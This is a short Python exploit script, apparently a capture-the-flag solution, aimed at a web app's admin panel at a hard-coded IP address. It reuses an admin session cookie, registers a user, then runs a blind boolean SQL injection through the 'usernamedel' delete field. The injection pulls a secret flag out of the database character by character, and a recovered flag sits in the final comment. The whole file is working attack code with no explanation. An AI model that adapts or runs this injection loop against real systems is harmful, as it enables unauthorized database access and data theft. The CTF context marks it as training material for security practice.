import requests

session = 'eyJuYW1lIjoiYWRtaW4ifQ.XB9uzA.8-ph57HDcpnq7VUAx7Pj21fuT1Q'
url = 'http://172.93.39.218:8888/admin'

s = requests.Session()

a = s.get(url=url, cookies={'session': session})

# print(a.text)
s.post(url=url, data={'username': 'smile', 'password': '123'}, cookies={'session': session})
s.post(url=url, data={'usernamedel': 'smile'}, cookies={'session': session})
# username=smil1e&password=123


usernamedel = "smile' and (select substr((select flag from flag),{},1)='{}') -- a"
lister = '0123456789abcdef{}'
word = ''
position = 5
while 1:
    for i in lister:
        print('[*] word= {}'.format(word + i))
        s.post(url=url, data={'usernamedel': usernamedel.format(position, i)}, cookies={'session': session})
        if 'smile' in s.get(url=url, cookies={'session': session}).content.decode('utf8'):
            s.post(url=url, data={'username': 'smile', 'password': '123'}, cookies={'session': session})
            continue
        else:
            print(s.get(url=url, cookies={'session': session}).text)
            s.post(url=url, data={'username': 'smile', 'password': '123'}, cookies={'session': session})
            word += i
            position += 1
            break
    print(word)
# flagpdb2e0093bi85c134d837